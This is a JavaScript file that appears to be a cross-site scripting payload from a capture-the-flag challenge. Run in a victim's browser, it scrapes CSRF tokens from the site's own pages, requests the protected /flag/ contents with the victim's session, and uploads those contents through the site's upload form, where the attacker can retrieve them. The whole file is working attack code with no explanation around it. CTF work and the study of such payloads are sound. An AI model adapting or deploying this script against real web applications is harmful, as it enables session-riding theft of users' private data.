function upload_flag(csrf_token, flag) {
    var formData = new FormData();

    var file = new File([encodeURI(flag)], "kc370758_daj_flage.txt", {type: "text/plain"});

    formData.append("csrfmiddlewaretoken", csrf_token);
    formData.append("image", file);
    formData.append("desc", "d");

    var upload_flag_req = new XMLHttpRequest();
    upload_flag_req.open("POST", "/upload/");
    upload_flag_req.send(formData);
}

function get_upload_token(flag) {
    var get_upload_token_req = new XMLHttpRequest();
    get_upload_token_req.open("GET", "/upload/", true);
    get_upload_token_req.onreadystatechange = function() {
        if (get_upload_token_req.readyState == 4 && get_upload_token_req.status == 200) {
            var parser = new DOMParser();
            var htmlDoc = parser.parseFromString(get_upload_token_req.responseText, "text/html");
            console.log("INFO: successfully sended get /upload/ request.");
            var csrf_token = htmlDoc.getElementsByName("csrfmiddlewaretoken")[0].value;
            console.log("INFO: csrf_token: " + csrf_token);
            upload_flag(csrf_token, flag);
        }
    }
    get_upload_token_req.send(null);
}

function show_flag(flag_tab) {
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(flag_tab, "text/html");
    var csrf_token = htmlDoc.getElementsByName("csrfmiddlewaretoken")[0].value;
    console.log("INFO: csrf_token from flag_tab: " + csrf_token);

    var form = new FormData();
    form.append("csrfmiddlewaretoken", csrf_token);

    var show_flag_req = new XMLHttpRequest();
    show_flag_req.open("POST", "/flag/", true);
    show_flag_req.onreadystatechange = function() {
        if (show_flag_req.readyState == 4) {
            console.log("INFO: successfully requested flag.");
            get_upload_token(show_flag_req.responseText);
        } else {
            get_upload_token(show_flag_req.responseText);
        }
    }
    show_flag_req.send(form);
}

function get_flag_tab() {
    var get_flag_tab_req = new XMLHttpRequest();
    get_flag_tab_req.open("GET", "/flag/", true);
    get_flag_tab_req.onreadystatechange = function() {
        if (get_flag_tab_req.readyState == 4 && get_flag_tab_req.status == 200) {
            console.log("INFO: successfully requested /flag/ tab.");
            show_flag(get_flag_tab_req.responseText);
        }
    }
    get_flag_tab_req.send(null);
}

get_flag_tab();
